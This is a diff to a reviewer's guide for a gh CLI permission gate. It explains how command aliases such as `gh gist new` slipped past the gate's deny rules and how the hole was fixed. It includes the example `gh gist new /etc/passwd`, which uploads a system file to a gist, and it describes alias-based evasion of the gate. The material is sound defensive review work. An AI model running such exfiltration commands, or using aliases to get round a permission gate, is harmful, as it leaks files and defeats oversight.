@@ -113,14 +113,36 @@ index is 1 and not 0. Dump it per pair with
 `gh release upload <tag> <files>...`,
 `gh gist edit {<id> | <url>} [<filename>]`, `gh release edit <tag>`.
 
-ALIASES is the one with teeth. `gist create`, `release create` and
-`issue create` each render `gh <noun> new`, and a table keyed on the canonical
-verb misses every alias: `gh gist new /etc/passwd` lands on the fail-closed
-unrecognized-verb **ask** instead of the containment **deny**. Grade it against
-main's binary before filing — on #232 main answered the alias rows `ask` too, so
-it was pre-existing (`ghRecoverableWriteVerbs` never modelled aliases either) and
-a follow-up issue rather than a finding on the PR. `grep -A3 '^ALIASES'` over the
-same dumps enumerates them in one pass.
+ALIASES is the one with teeth, and **it belongs on the PR, not in a follow-up
+issue.** `gist create`, `release create`, `issue create`, `pr create` and
+`repo create` each render `gh <noun> new`, and a table keyed on the canonical
+verb misses every alias, so `gh gist new /etc/passwd` landed on the fail-closed
+unrecognized-verb **ask** instead of the containment **deny**. #232 round 6
+resolves the alias to its canonical spelling before any tier runs
+(`classify_gh_aliases.go`), so that row now denies. The earlier grading — "main
+answers the alias rows `ask` too, so it is pre-existing and a follow-up issue" —
+was **overruled by Edwin**: the standard on a gate PR is *pre-existing on main +
+same defect class + in a verb the table models → fix it here*, which is how the
+implicit-stdin `gh gist create` hole, `-F=FILE` and the `-p=f` cluster stop had
+already been fixed on that same PR. Baseline against main to tell *residual*
+from *regression*, never to decide whether to file it.
+
+Enumerating aliases: `grep -A3 '^ALIASES'` over the per-verb help dumps gets the
+verbs you already listed, but the ALIASES block is rendered per COMMAND, so the
+complete set needs a walk of the whole tree (`gh <path> --help` recursively, 228
+commands on 2.97.0 — and the section headings are not just `AVAILABLE COMMANDS`;
+`gh pr`/`gh issue`/`gh repo`/`gh release` use `GENERAL COMMANDS` and
+`TARGETED COMMANDS`, so match `/ COMMANDS$/` or you silently skip those nouns).
+Reconcile it against `grep -rn "Aliases:" --include "*.go" | grep -v _test.go`
+in a cli/cli tarball at the tag (45 declarations on 2.97.0) — that grep is the
+authority, since `gh accessibility` sits under HELP TOPICS and the help walk
+never reaches its `a11y`. The alias names on the gate's own nouns are `ls`,
+`new`, `co`, `remove`; none is a member of `readVerbs` or
+`ghRecoverableWriteVerbs`, which is what made the pre-fix hole an ask and not an
+outright ALLOW — check that before grading the severity. gh's OTHER alias
+mechanism is the user config `gh alias set` writes (it ships `co: pr checkout`);
+it cannot shadow a modelled noun, because `gh alias set` refuses a name that is
+"already a gh command or extension".
 
 **A `<pattern>` operand needs no special handling and is not a hole**: the gate
 reads the pre-expansion command string, so quoted and unquoted spellings reach it
